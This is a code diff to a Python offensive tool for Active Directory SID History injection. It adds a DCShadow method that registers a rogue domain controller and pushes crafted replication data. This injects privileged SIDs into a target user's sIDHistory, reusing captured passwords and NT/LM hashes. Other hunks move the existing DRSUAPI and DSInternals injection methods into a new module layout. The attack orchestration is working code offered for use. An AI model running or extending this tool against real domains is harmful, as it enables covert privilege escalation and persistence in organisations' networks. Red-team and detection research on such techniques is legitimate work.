@@ -1,7 +1,7 @@
 """
 SID History Attack Implementation v2
 Main orchestrator: wires up authentication, LDAP operations,
-DRSUAPI calls, DSInternals injection, scanning, and output formatting.
+DRSUAPI calls, DSInternals injection, DCShadow, scanning, and output formatting.
 """
 
 import logging
@@ -18,9 +18,10 @@ class SIDHistoryAttack:
     """
     Main class for performing SID History operations from a remote Linux host.
 
-    Supports two injection methods:
+    Supports three injection methods:
     - dsinternals: Offline ntds.dit modification via DSInternals (can inject privileged SIDs)
     - drsuapi: DRSAddSidHistory opnum 20 (cross-forest only, v1 legacy)
+    - dcshadow: AD replication via rogue DC (no NTDS downtime, requires root)
     """
 
     def __init__(self, dc_ip: str, domain: str, dc_hostname: Optional[str] = None):
@@ -69,7 +70,7 @@ class SIDHistoryAttack:
         Uses stored credentials from LDAP auth if not provided.
         """
         try:
-            from .drsuapi import DRSUAPIClient
+            from .methods.drsuapi import DRSUAPIClient
         except ImportError as e:
             logging.error(f"DRSUAPI module unavailable: {e}")
             return False
@@ -226,7 +227,7 @@ class SIDHistoryAttack:
             sid_to_inject: Full SID string to inject
             dsinternals_path: Optional local path to DSInternals module on the DC
         """
-        from .injection import DSInternalsInjector
+        from .methods.dsinternals import DSInternalsInjector
 
         injector = DSInternalsInjector(
             dc_ip=self.dc_ip,
@@ -249,6 +250,48 @@ class SIDHistoryAttack:
             return success
         finally:
             injector.disconnect()
+
+    # ─── SID HISTORY INJECTION (DCShadow) ─────────────────────────────
+
+    def inject_sid_history_dcshadow(self, target_user: str, sid_to_inject: str,
+                                     attacker_ip: str,
+                                     computer_name: Optional[str] = None,
+                                     computer_password: Optional[str] = None,
+                                     drsuapi_port: int = 1337) -> bool:
+        """
+        Inject a SID into the target's sIDHistory using DCShadow replication.
+
+        Registers a rogue DC, serves crafted replication data, then cleans up.
+        Requires Domain Admin and root (port 135).
+
+        Args:
+            target_user: sAMAccountName of target
+            sid_to_inject: Full SID string to inject
+            attacker_ip: IP address reachable from the DC
+            computer_name: Optional rogue DC machine name
+            computer_password: Optional rogue DC machine password
+            drsuapi_port: Port for DRSUAPI RPC server (default 1337)
+        """
+        from .methods.dcshadow import DCShadowAttack
+
+        attack = DCShadowAttack(
+            dc_ip=self.dc_ip,
+            domain=self.domain,
+            base_dn=self.base_dn,
+            target_user=target_user,
+            sid_to_inject=sid_to_inject,
+            attacker_ip=attacker_ip,
+            username=self.auth_manager._username or '',
+            password=self.auth_manager._password or '',
+            lm_hash=self.auth_manager._lm_hash or '',
+            nt_hash=self.auth_manager._nt_hash or '',
+            ldap_connection=self.connection,
+            computer_name=computer_name,
+            computer_password=computer_password,
+            drsuapi_port=drsuapi_port,
+        )
+
+        return attack.execute()
 
     # ─── SID HISTORY INJECTION (DRSUAPI) ──────────────────────────────
 
@@ -336,19 +379,26 @@ class SIDHistoryAttack:
                            source_domain: Optional[str] = None,
                            src_creds_user: str = '',
                            src_creds_domain: str = '',
-                           src_creds_password: str = '') -> bool:
+                           src_creds_password: str = '',
+                           # DCShadow params
+                           attacker_ip: Optional[str] = None,
+                           computer_name: Optional[str] = None,
+                           computer_password: Optional[str] = None) -> bool:
         """
         Dispatch SID History injection to the appropriate method.
 
         Args:
             target_user: sAMAccountName of target
-            method: 'dsinternals' or 'drsuapi'
-            inject_value: Preset name or raw SID (for dsinternals)
-            inject_domain: Foreign domain for preset resolution (for dsinternals)
+            method: 'dsinternals', 'drsuapi', or 'dcshadow'
+            inject_value: Preset name or raw SID (for dsinternals/dcshadow)
+            inject_domain: Foreign domain for preset resolution (for dsinternals/dcshadow)
             dsinternals_path: Path to DSInternals on the DC (for dsinternals)
             source_user: Source user sAMAccountName (for drsuapi)
             source_domain: Source domain FQDN (for drsuapi)
             src_creds_*: Source domain credentials (for drsuapi)
+            attacker_ip: Attacker IP reachable from DC (for dcshadow)
+            computer_name: Rogue DC machine name (for dcshadow)
+            computer_password: Rogue DC machine password (for dcshadow)
         """
         if method == 'dsinternals':
             if not inject_value:
@@ -386,6 +436,35 @@ class SIDHistoryAttack:
                 src_creds_user=src_creds_user,
                 src_creds_domain=src_creds_domain,
                 src_creds_password=src_creds_password,
+            )
+
+        elif method == 'dcshadow':
+            if not inject_value:
+                logging.error("--inject is required for dcshadow method")
+                return False
+            if not attacker_ip:
+                logging.error("--attacker-ip is required for dcshadow method")
+                return False
+
+            sid_to_inject = self.resolve_inject_sid(inject_value, inject_domain)
+            if not sid_to_inject:
+                return False
+
+            sid_name = SIDConverter.resolve_sid_name(sid_to_inject)
+            print(f"\n[*] Injection target: {target_user}")
+            print(f"[*] SID to inject:   {sid_to_inject} ({sid_name})")
+            print(f"[*] Method:          DCShadow (AD replication)")
+            print(f"[*] Attacker IP:     {attacker_ip}")
+            if inject_domain:
+                print(f"[*] Source domain:   {inject_domain}")
+            print(f"[*] DC:              {self.dc_ip}")
+            print()
+
+            return self.inject_sid_history_dcshadow(
+                target_user, sid_to_inject,
+                attacker_ip=attacker_ip,
+                computer_name=computer_name,
+                computer_password=computer_password,
             )
 
         else:
